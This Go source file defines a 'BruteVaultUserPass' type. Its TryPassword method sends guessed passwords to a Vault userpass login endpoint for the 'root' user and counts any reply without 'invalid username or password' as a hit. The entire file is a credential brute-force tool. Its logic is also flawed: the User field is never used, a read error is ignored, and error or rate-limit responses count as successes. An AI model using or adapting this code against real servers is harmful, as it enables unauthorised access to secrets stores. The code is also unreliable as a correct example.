package vault

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
)

type BruteVaultUserPass struct {
	Endpoint string
	User     string
}

func (brute *BruteVaultUserPass) TryPassword(password string) (bool, error) {
	reqJson, err := json.Marshal(map[string]string{
		"password": password,
	})
	if err != nil {
		return false, err
	}
	reqData := bytes.NewBuffer(reqJson)
	url := fmt.Sprintf("%s/v1/auth/userpass/login/root", brute.Endpoint)
	resp, err := http.Post(url, "application/json", reqData)
	if err != nil {
		return false, err
	}
	defer func() {
		err = resp.Body.Close()
		if err != nil {
			log.Println(err)
		}
	}()

	body, err := ioutil.ReadAll(resp.Body)
	if strings.Contains(string(body), "invalid username or password") {
		return false, nil
	}

	return true, nil
}
